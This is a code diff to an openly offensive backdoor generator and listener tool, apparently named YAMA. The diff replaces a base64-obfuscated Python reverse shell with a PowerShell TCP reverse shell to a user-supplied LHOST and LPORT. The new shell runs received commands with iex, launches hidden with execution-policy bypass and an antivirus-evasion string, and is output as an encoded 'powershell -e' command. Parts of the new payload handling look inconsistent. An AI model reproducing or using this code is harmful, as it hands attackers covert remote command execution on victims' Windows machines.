@@ -10,8 +10,8 @@
 ###############
 import os
 import time
+import socket
 import base64
-import pyminifier
 import argparse
 
 YAMA_LOGO_BANNER = ("""
@@ -78,38 +78,47 @@ def TEXT_DELAY(TEXT, DELAY):
     print()
 
 def BACKDOOR():
-    LHOST = input(" \033[97;1m╔═[LHOST] ╚═════════>>> ")
-    LPORT = input(" \033[97;1m╔═[LPORT] ╚═════════>>> ")
+    print("")
+    LHOST = input(" \033[97;1m╔═[LHOST] \n ╚═════════>>> ")
+    print("")
+    LPORT = input(" \033[97;1m╔═[LPORT] \n ╚═════════>>> ")
 
-    PAYLOAD = '''
-import os
-import socket
-import subprocess
+    PAYLOAD = f'''
+ -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2>&1 | Out-String )
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()
+}}
+$client.Close()"   
+'''
 
-BHOST = "{LHOST}"
-BPORT = {LPORT}
+    BACKDOOR_CODE = f'''
+$encryptedPayload = "{PAYLOAD}";
 
-def BACKDOOR():
-    BACKDOOR_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    BACKDOOR_SOCKET.connect((BHOST, BPORT))
+function Decrypt-Payload($encryptedPayload) {{
+    $b64Payload = [System.Convert]::FromBase64String($encryptedPayload)
+    $plainPayload = [System.Text.Encoding]::UTF8.GetString($b64Payload)
+    return $plainPayload
+}}
 
-    while True:
-        COMMAND = BACKDOOR_SOCKET.recv(8192).decode()
+# Fonction pour exécuter la commande
+function Execute-Command($command){{
+    $encodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
+    $bypassDefenderCommand = "-win inputformat none (Get-Command 'Invoke-Expression').ScriptBlock.InvokeHide '#' sihk"
+    $encodedCommand += " " + $bypassDefenderCommand
+    Start-Process PowerShell -ArgumentList ('-NoProfile -ExecutionPolicy bypass -EncodedCommand {{0}}' -f $encodedCommand) -WindowStyle Hidden
+}}
 
-        if COMMAND == "exit":
-            BACKDOOR_SOCKET.close()
-            break
-
-        OUTPUT = subprocess.check_output(COMMAND, shell=False, stderr=subprocess.STDOUT).decode()
-        
-        BACKDOOR_SOCKET.send(OUTPUT.encode())
-
-BACKDOOR()    
+$payloadScript = Decrypt-Payload $encryptedPayload
+Execute-Command $payloadScript 
 '''
     
-    PAYLOAD_OBFUSCATED = base64.b64encode(pyminifier.dedent(PAYLOAD).encode()).decode()
+    PAYLOAD_OBFUSCATED = base64.b64encode(BACKDOOR_CODE.encode()).decode()
     
-    BACKDOOR_RAW = f"eval(compile(base64.b64decode('{PAYLOAD_OBFUSCATED}'.encode()), '<string>', 'exec'))"
+    BACKDOOR_RAW = PAYLOAD_OBFUSCATED
     return BACKDOOR_RAW
     
 def LISTENER():
@@ -119,11 +128,11 @@ def LISTENER():
     TEXT_DELAY(YAMA_LOGO_BANNER, 0.0005)
     TEXT_DELAY(YAMA_LISTENER_BANNER, 0.0005)
 
-    LHOST = input(" \033[97;1m╔═[LHOST] ╚═════════>>> ")
-    LPORT = input(" \033[97;1m╔═[LPORT] ╚═════════>>> ")
+    LHOST = input(" \033[97;1m╔═[LHOST] \n ╚═════════>>> ")
+    LPORT = input(" \033[97;1m╔═[LPORT] \n ╚═════════>>> ")
 
     LISTENER_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    LISTENER_SOCKET.bind((LHOST, LPORT))
+    LISTENER_SOCKET.bind((LHOST, int(LPORT)))
     LISTENER_SOCKET.listen(1)
     print(f" [...] Waiting for a connection on {LHOST}:{LPORT}")
     
@@ -209,7 +218,7 @@ def COMMANDS():
         BACKDOOR_RAW = BACKDOOR()
         time.sleep(2)
         print("[...] Generation of the backdoor in progress...")
-        print(BACKDOOR_RAW)
+        print("powershell -e", BACKDOOR_RAW)
     else:
         YAMA()
 
